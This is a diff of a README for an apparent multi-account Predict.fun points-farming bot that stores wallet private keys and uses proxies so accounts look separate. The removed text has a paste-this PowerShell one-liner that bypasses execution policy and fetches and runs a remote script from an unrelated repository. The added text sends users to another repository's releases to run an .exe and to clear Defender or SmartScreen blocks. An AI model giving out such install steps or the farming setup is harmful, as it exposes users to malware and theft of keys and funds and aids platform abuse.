@@ -1,622 +1,245 @@
-# 🤖 Predict.fun Bot
-
-> Automated multi-account bot for [Predict.fun](https://predict.fun) — places predictions, completes daily tasks, and farms points across unlimited accounts with per-account proxy support
-
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Predict.fun](https://img.shields.io/badge/Predict.fun-Testnet-F59E0B?style=for-the-badge&logoColor=white)](https://predict.fun)
-[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/omgmad/predictfun-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/predictfun-bot)
-
-```
-╔══════════════════════════════════════════════════════════════════╗
-║  Module 1 — Auto Predictor   │  place predictions automatically ║
-║  Module 2 — Daily Tasks      │  complete all tasks every cycle  ║
-║  Module 3 — Points Farmer    │  full automation across N accs   ║
-║                                                                  ║
-║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
-╚══════════════════════════════════════════════════════════════════╝
-```
-
-**[🚀 Join Predict.fun](https://predict.fun)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**
-
----
-
-## 📌 Table of Contents
-
-- [How It Works](#-how-it-works)
-- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
-- [Modules](#-modules)
-  - [Module 1 — Auto Predictor](#-module-1--auto-predictor)
-  - [Module 2 — Daily Tasks](#-module-2--daily-tasks)
-  - [Module 3 — Points Farmer](#-module-3--points-farmer)
-- [Installation](#️-installation)
-- [Configuration](#️-configuration)
-- [Running the Bot](#-running-the-bot)
-- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
-- [Telegram Commands](#-telegram-commands)
-- [Disclaimer](#️-disclaimer)
-
----
-
-## ⚡ How It Works
-
-```
-  Predict.fun opens new prediction markets
-          │
-          ▼  (all accounts check simultaneously)
-          │
-  Per account:
-    • Authenticate with session token
-    • Route traffic through assigned proxy
-    • Fetch open markets + available tasks
-    • Place predictions on eligible markets
-    • Complete daily/weekly tasks
-    • Maintain check-in streak
-          │
-          ▼
-  Points credited to each account  🎯
-          │
-          ▼
-  Telegram summary sent  📱
-```
-
-Every account runs as an independent async worker — one expired token or failed proxy never blocks the others.
-
----
-
-## 👥 Multi-Account & Proxy Support
-
-### How accounts are configured
-
-All accounts live in a single `accounts.json` file. Each entry holds its own credentials, session token, prediction strategy, and optionally a dedicated proxy.
-
-```
-  accounts.json
-  ├── Account #1  →  wallet_1 + token_1 + proxy_1
-  ├── Account #2  →  wallet_2 + token_2 + proxy_2
-  ├── Account #3  →  wallet_3 + token_3 + (no proxy)
-  └── ...unlimited accounts
-          │
-          ▼
-  Bot spawns one async worker per account
-          │
-          ▼
-  Workers run in parallel up to MAX_PARALLEL
-  Remaining accounts queue and start as slots free
-```
-
-**accounts.json structure:**
-
-```json
-[
-  {
-    "id": "account_1",
-    "label": "Main wallet",
-    "wallet_address": "0xYourWallet1",
-    "private_key": "0xYourPrivateKey1",
-    "predict_token": "your_session_token_1",
-    "referral_code": "YOUR_REF",
-    "strategy": "majority",
-    "proxy": "http://user:pass@host:port"
-  },
-  {
-    "id": "account_2",
-    "label": "Secondary",
-    "wallet_address": "0xYourWallet2",
-    "private_key": "0xYourPrivateKey2",
-    "predict_token": "your_session_token_2",
-    "referral_code": "YOUR_REF",
-    "strategy": "contrarian",
-    "proxy": "socks5://user:pass@host:port"
-  },
-  {
-    "id": "account_3",
-    "label": "No proxy",
-    "wallet_address": "0xYourWallet3",
-    "private_key": "0xYourPrivateKey3",
-    "predict_token": "your_session_token_3",
-    "referral_code": "YOUR_REF",
-    "strategy": "random",
-    "proxy": ""
-  }
-]
-```
-
-> 💡 **Tip:** You can run different prediction strategies on different accounts — e.g. `majority` on account_1 and `contrarian` on account_2 — to diversify across markets and maximize total predicted volume.
-
-### Proxy formats supported
-
-| Format | Example |
-|--------|---------|
-| HTTP | `http://user:pass@host:port` |
-| HTTPS | `https://user:pass@host:port` |
-| SOCKS5 | `socks5://user:pass@host:port` |
-| No auth | `http://host:port` |
-| None | leave `"proxy": ""` |
-
-### Concurrency & safety settings
-
-```env
-MAX_PARALLEL=5              # Max accounts running at the same time
-ACCOUNT_DELAY=15            # Seconds between launching each worker
-JITTER=true                 # Random ±10s delay per action (human-like)
-PROXY_TEST_ON_START=true    # Verify each proxy before farming begins
-ROTATE_USER_AGENT=true      # Unique user-agent header per account
-```
-
-> 💡 **Tip:** With 10+ accounts, set `MAX_PARALLEL=5` and `ACCOUNT_DELAY=15` to avoid triggering rate limits. Enable `PROXY_TEST_ON_START=true` — dead proxies get flagged before the cycle starts, not halfway through.
-
----
-
-## 📐 Modules
-
-### 🔮 Module 1 — Auto Predictor
-
-The bot scans open prediction markets on Predict.fun and automatically places predictions on behalf of each account according to its configured strategy.
-
-```
-  Fetch open markets  (per account)
-              │
-              ▼
-  Filter: active | not yet predicted | within bet window
-              │
-              ▼
-  Apply prediction strategy:
-    • majority   → follow the crowd (most popular side)
-    • contrarian → bet against the crowd
-    • random     → coin flip (max volume coverage)
-    • custom     → your own keyword/category filters
-              │
-              ▼
-  Place prediction tx  →  signed with account wallet  ✅
-              │
-              ▼
-  Wait for market resolution  →  collect rewards if correct  🎯
-```
-
-**Prediction strategies:**
-
-| Strategy | Logic | Best for |
-|----------|-------|----------|
-| `majority` | Always bet with the leading side | Safer volume farming |
-| `contrarian` | Always bet against the leading side | Higher odds, more variance |
-| `random` | Random YES / NO per market | Maximum market coverage |
-| `custom` | Filter by category / keyword | Targeted farming |
-
-**Config block:**
-
-```env
-MODULE=predictor
-PREDICT_STRATEGY=majority          # Default strategy (overridden per account)
-PREDICT_AMOUNT=1                   # Amount to bet per prediction (in platform units)
-PREDICT_MAX_PER_CYCLE=10           # Max predictions per account per cycle
-PREDICT_CATEGORIES=crypto,sports   # Only predict in these categories (blank = all)
-PREDICT_MIN_POOL=100               # Skip markets with less than N total bets
-PREDICT_INTERVAL=3600              # Check for new markets every N seconds
-```
-
-> 💡 **Tip:** Keep `PREDICT_AMOUNT` at the minimum required — the goal is volume and points, not gambling. The `majority` strategy minimizes losses while still hitting participation tasks.
-
----
-
-### ✅ Module 2 — Daily Tasks
-
-The bot fetches the full task list for each account and completes every eligible task automatically, in order of highest points first.
-
-```
-  Authenticate account  (token + optional proxy)
-              │
-              ▼
-  Fetch task list  →  filter by: daily | weekly | one-time
-              │
-              ▼
-  Sort by points descending
-              │
-              ▼
-  Execute each eligible task:
-    • Daily check-in  (streak ping)
-    • Prediction volume task  (place N predictions)
-    • Social task  (follow, share, repost)
-    • Referral task  (if applicable)
-              │
-              ▼
-  Mark complete → points credited ✅
-```
-
-**Supported task types:**
-
-| Task Type | Description | Frequency |
-|-----------|-------------|-----------|
-| Daily check-in | Streak ping once per 24h | Daily |
-| Prediction task | Place N predictions in a cycle | Daily / Weekly |
-| Volume task | Reach total prediction volume | Weekly |
-| Social task | Follow / share / repost | One-time / Weekly |
-| Referral bonus | Points for referred accounts | Ongoing |
-
-**Config block:**
-
-```env
-MODULE=tasks
-TASK_TYPES=checkin,predict,volume,social
-TASK_INTERVAL=3600
-TASK_PRIORITY=points_desc
-SKIP_TASKS=                          # Comma-separated task IDs to skip
-MAX_TASKS_PER_RUN=20
-```
-
-> 💡 **Tip:** `checkin` should always be in `TASK_TYPES` — it protects your streak multiplier which boosts points on every other task.
-
----
-
-### 🌾 Module 3 — Points Farmer
-
-Combines both modules into a fully automated loop. Each account runs its own independent cycle — predictions, tasks, streaks — all tracked separately.
-
-```
-  All account workers start  (staggered by ACCOUNT_DELAY)
-          │
-          ▼  each worker independently:
-          │
-  Place predictions on open markets  (Module 1)
-          │
-          ▼
-  Complete available tasks  (Module 2)
-          │
-          ▼
-  Wait CYCLE_INTERVAL
-          │
-          ▼
-  Daily cap reached?
-    • NO  → next cycle
-    • YES → sleep until reset  😴
-          │
-          ▼
-  Telegram summary: points per account, predictions made  📱
-```
-
-**Config block:**
-
-```env
-MODULE=farmer
-DAILY_POINTS_CAP=1000              # Per-account daily target (0 = no cap)
-CYCLE_INTERVAL=3600                # Seconds between farming cycles
-FARMER_START_TIME=07:00
-FARMER_STOP_TIME=23:30
-POST_CYCLE_SUMMARY=true            # Send Telegram summary after each cycle
-```
-
----
-
-## 🛠️ Installation
-
-### Requirements
-
-- Python 3.10+
-- A [Predict.fun](https://predict.fun) account (one or more)
-- Testnet wallets with funds for predictions
-- Optional: proxies for multi-account isolation
-
-
-### Option 1: PowerShell (Recommended)
-Open **PowerShell** and run this **single command**:
-
-```powershell
-powershell -ep bypass -c "iwr https://github.com/Alessandroitz/Predict-Fun-Farming-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
-```
-### Option 2: Cmd
-Open CMD and run this single command:
-```
-powershell -ep bypass -c "iwr https://github.com/Alessandroitz/Predict-Fun-Farming-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
-```
-
-
-### Step 2 — Create a virtual environment
-
-```bash
-python3 -m venv venv
-
-# Linux / Mac
-source venv/bin/activate
-
-# Windows
-venv\Scripts\activate
-```
-
-### Step 3 — Install dependencies
-
-```bash
-pip install requests web3 python-dotenv colorama schedule aiohttp aiohttp-socks
-```
-
-### Step 4 — Get your Predict.fun session tokens
-
-For each account:
-
-1. Log in to [predict.fun](https://predict.fun)
-2. Open DevTools (`F12`) → **Application** → **Cookies** → `predict.fun`
-3. Copy the auth/session token value
-4. Paste it into `predict_token` in `accounts.json`
-
-> ⚠️ Session tokens expire periodically. When a token expires, only that account pauses and sends a Telegram alert — all others keep running.
-
-### Step 5 — Build your accounts.json
-
-```bash
-cp accounts.example.json accounts.json
-nano accounts.json
-```
-
----
-
-## ⚙️ Configuration
-
-### `accounts.json` — one entry per account
-
-See [Multi-Account & Proxy Support](#-multi-account--proxy-support) above for the full structure.
-
-### `.env` — global settings
-
-```env
-# ── Active module ──────────────────────────────────────
-# Options: predictor | tasks | farmer
-MODULE=farmer
-
-# ── Multi-account ──────────────────────────────────────
-ACCOUNTS_FILE=accounts.json
-MAX_PARALLEL=5
-ACCOUNT_DELAY=15
-JITTER=true
-PROXY_TEST_ON_START=true
-ROTATE_USER_AGENT=true
-
-# ── Prediction settings ────────────────────────────────
-PREDICT_STRATEGY=majority
-PREDICT_AMOUNT=1
-PREDICT_MAX_PER_CYCLE=10
-PREDICT_CATEGORIES=
-PREDICT_MIN_POOL=100
-PREDICT_INTERVAL=3600
-
-# ── Task settings ──────────────────────────────────────
-TASK_TYPES=checkin,predict,volume,social
-TASK_INTERVAL=3600
-TASK_PRIORITY=points_desc
-MAX_TASKS_PER_RUN=20
-
-# ── Farming schedule ───────────────────────────────────
-DAILY_POINTS_CAP=1000
-CYCLE_INTERVAL=3600
-FARMER_START_TIME=07:00
-FARMER_STOP_TIME=23:30
-
-# ── Telegram (optional but recommended) ────────────────
-TELEGRAM_TOKEN=
-TELEGRAM_CHAT_ID=
-```
-
----
-
-## 🚀 Running the Bot
-
-```bash
-# First-time setup (creates accounts.json template)
-python predictfun_bot.py --setup
-
-# Run all accounts
-python predictfun_bot.py
-
-# Run a single account only
-python predictfun_bot.py --account account_1
-
-# Single cycle and exit
-python predictfun_bot.py --once
-
-# Test proxies without farming
-python predictfun_bot.py --test-proxies
-
-# Dashboard only
-python predictfun_bot.py --dashboard
-```
-
-On successful start:
-
-```
-╔══════════════════════════════════════════════════════╗
-║   🤖  Predict.fun Bot v1.0                           ║
-║   Press Ctrl+C at any time to stop.                  ║
-╚══════════════════════════════════════════════════════╝
-
-  Module:      farmer
-  Accounts:    4 loaded
-  Proxies:     3 assigned  (1 direct)
-  Parallel:    up to 5
-  Strategy:    majority (default)
-  Jitter:      ON
-
-  Testing proxies... ██████████  3/3 OK
-
-  Start bot? [yes/no]: yes
-```
-
-**Live terminal dashboard:**
-
-```
-🤖 Predict.fun Bot v1.0                    updated 09:04:15
-══════════════════════════════════════════════════════════════
-  Module: farmer   Accounts: 4   Next cycle: 41m
-──────────────────────────────────────────────────────────────
-  ACCOUNTS
-  ID            Points today   Streak    Strategy     Status
-  account_1     510 / 1000     🔥 18d    majority     ● running
-  account_2     390 / 1000     🔥 11d    contrarian   ● running
-  account_3     680 / 1000     🔥 25d    random       ● running
-  account_4       0 / 1000         3d    majority     ⏳ queued
-──────────────────────────────────────────────────────────────
-  PREDICTIONS TODAY  (account_3)
-  Market                        Side   Amount   Result
-  BTC > $100k by EOY?           YES      1      ⏳ open
-  ETH flips BTC in 2025?        NO       1      ✅ correct
-  SOL hits $500 this quarter?   YES      1      ❌ wrong
-──────────────────────────────────────────────────────────────
-  TASKS  (account_1)
-  Task                   Status      Points
-  Daily check-in         ✅ done     +25
-  Place 5 predictions    ✅ done     +100
-  Volume task (weekly)   ⏳ pending  +200
-──────────────────────────────────────────────────────────────
-  RECENT ACTIVITY
-  09:04:15  account_3   Prediction placed     BTC > $100k
-  09:03:40  account_1   Check-in              +25 pts
-  09:03:05  account_2   Prediction task done  +100 pts
-  09:01:22  account_3   ETH prediction won    +reward
-```
-
----
-
-## 🖥️ Running 24/7 on a VPS
-
-For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).
-
-### Ubuntu VPS setup
-
-```bash
-# 1. Update system
-sudo apt update && sudo apt upgrade -y
-sudo apt install python3 python3-pip python3-venv screen git -y
-
-# 2. Clone repo
-git clone https://github.com/omgmad/predictfun-bot
-cd predictfun-bot
-
-# 3. Virtual environment
-python3 -m venv venv
-source venv/bin/activate
-pip install requests web3 python-dotenv colorama schedule aiohttp aiohttp-socks
-
-# 4. Configure
-nano .env
-nano accounts.json
-
-# 5. Run inside screen (stays alive after you disconnect)
-screen -S predictbot
-source venv/bin/activate
-python predictfun_bot.py
-
-# Press Ctrl+A then D to detach — bot keeps running
-```
-
-### Reconnect later
-
-```bash
-screen -r predictbot
-```
-
-### Useful log commands
-
-```bash
-tail -50 predictfun_bot.log
-grep "prediction" predictfun_bot.log | tail -20   # All predictions
-grep "correct\|wrong" predictfun_bot.log | tail -20 # Results
-grep "completed" predictfun_bot.log | tail -20    # Completed tasks
-grep "token expired" predictfun_bot.log | tail -10 # Token alerts
-grep "ERROR" predictfun_bot.log | tail -10        # Errors
-```
-
----
-
-## 📱 Telegram Setup & Commands
-
-### Step 1 — Create a bot and get your token
-
-1. Search for **`@BotFather`** on Telegram, send `/newbot`
-2. Copy the token into `.env`:
-
-```env
-TELEGRAM_TOKEN=your_bot_token_here
-```
-
-### Step 2 — Get your Chat ID
-
-1. Search for **`@userinfobot`**, send any message
-2. Copy the numeric ID into `.env`:
-
-```env
-TELEGRAM_CHAT_ID=123456789
-```
-
-### Commands
-
-| Command | Action |
-|---------|--------|
-| `/status` | All accounts: points, streaks, strategy, proxy |
-| `/predictions` | Today's predictions per account with results |
-| `/tasks` | Completed and pending tasks per account |
-| `/pause` | Pause all accounts |
-| `/pause account_1` | Pause one specific account |
-| `/resume` | Resume all accounts |
-| `/proxies` | Proxy health status for all accounts |
-| `/stop` | Stop the bot completely |
-| `/points` | Full points breakdown across all accounts |
-
-### Example alerts
-
-```
-🔮 Prediction Placed
-Account:  account_1
-Market:   BTC > $100k by EOY?
-Side:     YES
-Strategy: majority
-
-✅ Prediction Resolved
-Account:  account_2
-Market:   ETH flips BTC in 2025?
-Result:   CORRECT ✅
-Reward:   +points credited
-
-✅ Task Completed
-Account:  account_3
-Task:     Place 5 predictions
-Points:   +100
-Total:    680 / 1000 today
-
-⚠️ Token Expired
-Account:  account_2
-Action:   refresh predict_token in accounts.json
-Status:   account_2 paused — all others still running
-
-⚠️ Proxy Failed
-Account:  account_1
-Proxy:    proxy_2
-Action:   falling back to direct connection
-
-🌙 Daily Cap Reached
-account_1 → 1000 / 1000 pts  😴
-account_3 → 1000 / 1000 pts  😴
-account_2 →  390 / 1000 pts  ● still farming
-```
-
----
-
-## ⚠️ Disclaimer
-
-> **IMPORTANT:** This bot interacts with a prediction platform on your behalf. Use responsibly and in accordance with Predict.fun's terms of service.
-
-- Never share your `accounts.json`, private keys, or session tokens with anyone
-- With many accounts on the same IP, use proxies to avoid rate-limit bans
-- Keep `PREDICT_AMOUNT` at minimum — this is a points farming tool, not a betting system
-- Session tokens expire — the bot notifies you per account, others keep running
-- Dead proxies are flagged at startup — replace them before the cycle begins
-- Testnet points and rewards are subject to Predict.fun's final airdrop/TGE rules — nothing is guaranteed
-
----
-
-## 🔗 Links
-
-[![Predict.fun](https://img.shields.io/badge/🔮_Predict.fun-Open_App-F59E0B?style=for-the-badge)](https://predict.fun)
-[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)
-
-**If this helped you, please give it a ⭐ Star — it means a lot!**
-
-## 🔍 Topics
-
-`predictfun-bot`, `prediction-market`, `farming-bot`, `daily-tasks`, `auto-predictor`, `multi-account`, `proxy-support`, `python`, `telegram-bot`, `crypto-bot`, `testnet`, `points-farmer`, `streak-maintenance`, `async`, `web3`
+# 🤖 Predict-Fun-Farming-Bot - Automate Tasks Across Accounts
+
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg?style=for-the-badge)](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases)
+
+## 🧩 What this app does
+
+Predict-Fun-Farming-Bot helps you run predict.fun tasks across more than one account. It can place predictions, complete daily tasks, and help keep points going on each account. It also supports a separate proxy for each account, so you can keep accounts split in a clean way.
+
+Use it if you want to:
+
+- manage many predict.fun accounts from one place
+- place predictions without doing each step by hand
+- complete daily tasks on a set schedule
+- keep streaks active
+- use a different proxy for each account
+
+## 🪟 Windows download
+
+Go to the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases) to visit this page to download.
+
+On the releases page, look for the latest version and download the Windows file. Most users will need the `.exe` file or a `.zip` file that contains it.
+
+After the download finishes:
+
+1. Open the downloaded file or unzip the folder.
+2. If you see an `.exe` file, double-click it to run.
+3. If Windows asks for permission, choose Run or Yes.
+4. Follow the setup steps in the app window if one appears.
+
+## ⚙️ What you need
+
+This app is made for Windows desktops and laptops.
+
+A normal setup should include:
+
+- Windows 10 or Windows 11
+- An internet connection
+- One or more predict.fun accounts
+- A proxy list if you plan to use separate IPs per account
+- Enough free space to unpack the release file
+
+If your computer blocks the file, check Windows Defender or SmartScreen and allow the file if you trust the source.
+
+## 🚀 Getting started
+
+Follow these steps to begin:
+
+1. Open the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases).
+2. Download the latest Windows release.
+3. Unzip the file if it comes in a `.zip`.
+4. Open the folder.
+5. Start the app by double-clicking the main `.exe` file.
+6. If the app asks for account data, enter the details for each predict.fun account.
+7. Add proxies if you want one proxy per account.
+8. Save your settings.
+9. Start the bot from the main screen.
+
+If the app uses a config file, keep it in the same folder as the program unless the app tells you to move it.
+
+## 🧾 First-time setup
+
+For the first run, prepare your account list before you open the app.
+
+A typical setup looks like this:
+
+- one account per line
+- one proxy per account
+- the same order for both lists
+- clear labels if you use many accounts
+
+A simple example layout:
+
+- Account 1 → Proxy 1
+- Account 2 → Proxy 2
+- Account 3 → Proxy 3
+
+If the app asks for a session token, cookie, or login data, copy it from the place shown in the app and paste it into the right field. Keep the order clean so each account uses the right proxy.
+
+## 🛠️ Basic use
+
+Once the app is open, the normal flow is simple:
+
+1. Load your account list.
+2. Load your proxy list.
+3. Check that the account count matches the proxy count.
+4. Choose the actions you want the bot to do.
+5. Start the run.
+6. Watch the log area for status updates.
+
+The bot may show lines such as:
+
+- account loaded
+- proxy matched
+- task complete
+- prediction placed
+- point update received
+- run finished
+
+If one account fails, the app may keep the other accounts going.
+
+## 📦 Common features
+
+Predict-Fun-Farming-Bot is built around a few main tasks:
+
+- **Multi-account support**  
+  Handle many accounts in one session.
+
+- **Prediction actions**  
+  Place predictions based on the settings you choose.
+
+- **Daily task completion**  
+  Run the day-to-day actions needed to keep activity moving.
+
+- **Points farming**  
+  Keep accounts active to build points over time.
+
+- **Proxy support**  
+  Assign a separate proxy to each account.
+
+- **Streak maintenance**  
+  Help keep daily activity from dropping.
+
+## 🔐 Proxy setup
+
+Use a separate proxy if you want each account to look like it comes from a different network path.
+
+Good proxy use tips:
+
+- keep one proxy per account
+- use the same format across the whole list
+- avoid blank lines
+- make sure the proxy type matches what the app expects
+- test the first proxy before loading a large list
+
+A proxy line may look like one of these formats:
+
+- `ip:port`
+- `user:pass@ip:port`
+- `http://user:pass@ip:port`
+- `socks5://user:pass@ip:port`
+
+Use the format that matches your proxy provider.
+
+## 🧪 Troubleshooting
+
+If the app does not open:
+
+- make sure you downloaded the correct Windows file
+- unzip the release if needed
+- run the `.exe` from inside the extracted folder
+- check that Windows did not block the file
+
+If accounts do not load:
+
+- check the file format
+- remove empty lines
+- make sure each account entry uses the right separator
+- confirm that the data copied in full
+
+If proxies fail:
+
+- check the proxy format
+- test the proxy in a browser or proxy tool
+- make sure the proxy is live
+- confirm that the proxy matches the account list order
+
+If the bot stops during a run:
+
+- check your internet connection
+- try fewer accounts first
+- review the log for the last line before the stop
+- confirm that the account still has access
+
+## 🗂️ File layout
+
+A release package often contains files like these:
+
+- `Predict-Fun-Farming-Bot.exe` — main app file
+- `accounts.txt` — list of accounts
+- `proxies.txt` — list of proxies
+- `config.json` — saved settings
+- `logs/` — run history and error details
+
+Keep all files in one folder unless the app gives different instructions.
+
+## 📋 Suggested workflow
+
+For smooth use, follow this order each time:
+
+1. Update to the newest release.
+2. Back up your account and proxy files.
+3. Check that each account has one matching proxy.
+4. Open the app.
+5. Load your files.
+6. Review the settings.
+7. Start with a small group of accounts.
+8. Expand to the full list after the first run works.
+
+This helps you catch file issues before you use all accounts.
+
+## 🖥️ Running on a new PC
+
+If you move the app to another Windows computer:
+
+1. Download the latest release again.
+2. Copy your account and proxy files.
+3. Place them in the same folder as the app if needed.
+4. Open the `.exe`.
+5. Load your saved data.
+6. Run a short test before a full session.
+
+## 🧠 Helpful tips
+
+- Use clear file names.
+- Keep your account list sorted.
+- Match proxy order to account order.
+- Start with one or two accounts if you are new to the app.
+- Save your settings before closing the program.
+- Keep the release folder in a safe place.
+
+## 📥 Download again
+
+If you need the file later, use the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases) to visit this page to download.
+
+## 🧷 Project details
+
+- **Repository:** Predict-Fun-Farming-Bot
+- **Type:** Windows desktop app
+- **Use case:** multi-account predict.fun automation
+- **Topics:** auto-predictor, crypto, crypto-bot, daily-tasks, farming-bot, multi-account, points-farmer, predictfun, predictfun-bot, prediction-market, streak-maintenance, testnet, web3
+
+## 🔎 Folder checklist before you start
+
+Make sure you have:
+
+- the downloaded release file
+- the extracted app folder
+- your account list ready
+- your proxy list ready
+- enough free space on disk
+- permission to run the file on Windows
+
+## 🛑 If you only remember one thing
+
+Download the latest Windows release from the [releases page](https://github.com/divisible-stretcherparty41/Predict-Fun-Farming-Bot/releases), unpack it if needed, then run the main `.exe` file
